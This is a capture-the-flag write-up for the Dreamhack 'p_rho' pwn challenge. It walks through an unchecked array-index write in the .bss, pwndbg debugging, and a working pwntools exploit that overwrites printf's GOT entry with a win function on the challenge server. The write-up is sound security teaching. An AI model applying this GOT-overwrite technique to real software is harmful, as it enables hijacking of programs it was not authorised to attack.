+++
date = '2026-05-09'
draft = false
title = 'Dreamhack p_rho Writeup'
ShowToc = true
tags = ["Dreamhack", "pwn"]
+++


## Challenge overview
    
이 문제는 서버에서 작동하고 있는 서비스(cpp-type-confusion)의 바이너리와 소스 코드가 주어집니다.
프로그램의 취약점을 찾아 flag를 획득하세요!
"flag" 파일의 내용을 워게임 사이트에 인증하면 점수를 획득할 수 있습니다.
플래그의 형식은 DH{...} 입니다.

---

pollard rho but not pollard rho?

---

```c
int __fastcall __noreturn main(int argc, const char **argv, const char **envp)
{
  __int64 v3; // [rsp+8h] [rbp-18h] BYREF
  __int64 i; // [rsp+10h] [rbp-10h]
  unsigned __int64 v5; // [rsp+18h] [rbp-8h]

  v5 = __readfsqword(0x28u);
  setvbuf(stdin, 0, 2, 0);
  setvbuf(stdout, 0, 2, 0);
  setvbuf(stderr, 0, 2, 0);
  for ( i = 0; ; i = buf[i] )
  {
    printf("val: ");
    __isoc99_scanf("%lu", &v3);
    buf[i] = v3;
  }
}
```

## Identifying the vulnerabilities

There is also a `win` function.

The `buf` in this case is located in the `.bss` at `0x404080`.

We send an unsigned long through `v3`, and then `buf[i]` will take that value.

Each iteration, `i` becomes `buf[i]`. Let's see what `buf[i]` (or `buf[0]`, specifically) is in the first iteration.

Looking in `pwndbg`, it starts at 0. I analyzed at the behaviour, and this is what happens:

- If we write `5`, `buf[previous]` becomes `5`, and `i` becomes `5`

- Now, if we write `6`, `buf[5 * 8]` will get the value `6`.

So we can just write places, starting from `.bss`. I'm thinking, what if we overwrite one of these function's got to just point to `win`? Let's try it...

~~I don't know where I got these GOT offsets from, but they're completely wrong; The logic is fine though... Don't worry, I'll realise that in a moment...~~

For `printf`: `(404898 - 404080) / 8 = 103`

I sent `0x103` from hex, as deci 259; Then send address of win from hex as deci, which is `4198838`. My maths was right, and looking at the debugger, we overwrote the got entry for `printf`!

```bash
pwndbg> x/x 0x404898
0x404898:       0x00000000004011b6
```
It crashed though, quick after `scanf`:  `<Cannot dereference [0x240ce30]>`

Do you see the problem?

```bash
pwndbg> p/d 4198838 * 8
$5 = 33590704
pwndbg> p/d 0x0x240ce30
❌️ Invalid number "0x0x240ce30".
pwndbg> p/d 0x240ce30
$6 = 37801520
pwndbg> p/d 0x2008db0
$7 = 33590704
```

As it's preparing for the next address, which will be `buf[8 * input]`, its hitting an impossible address. So our input is too large. 

BUT, that's only because it didn't jump execution there. So something's off...



I actually printed the `got` values in pwntools and realised that my offsets were completely wrong.

~~Finally!~~

```bash
pwndbg> x/gx 0x404008
0x404008 <printf@got.plt>:      0x00007ffff7e061c0
pwndbg> p/x 0x404008 - 0x404080
$10 = 0xffffff88
pwndbg> p/lu 0xffffff88
$12 = 4294967176
pwndbg> p/ld 0x00000000ffffff88
$20 = -120
```

Well... I tried my luck sending a negative value, and it worked! Sending `-15` successfully landed on the got!

```bash
pwndbg> x/x 0x404008
0x404008 <printf@got.plt>:      0x0000000000000064
```

Now, we can just make a script to send the `win` address instead and we're set.

It works locally, so, all we need to do is grab the flag!

![challenge-screenshot](flag.png#center)

## The exploit

```python
from pwn import *
elf = ELF('/home/kali/Downloads/dreamhack/p_rho/deploy/prob')

context.arch = 'amd64'
cyberedu = 'host3.dreamhack.games:17345'

ip, port = cyberedu.split(':')
port = int(port)

if args.REMOTE:
    p = remote(ip, port)
else:
    p = elf.process()
    

print(elf.got)
p.recvuntil(b"val: ")
p.sendline(b"-15") #to printf got, in unsigned long
p.sendline(b"4198838") #address of win in decimal

p.interactive()
```

---

As always, the full code can be found on my GitHub 
**[here](https://github.com/irinasusca/ctf-writeups/blob/main/dreamhack/p_rho.py)**.
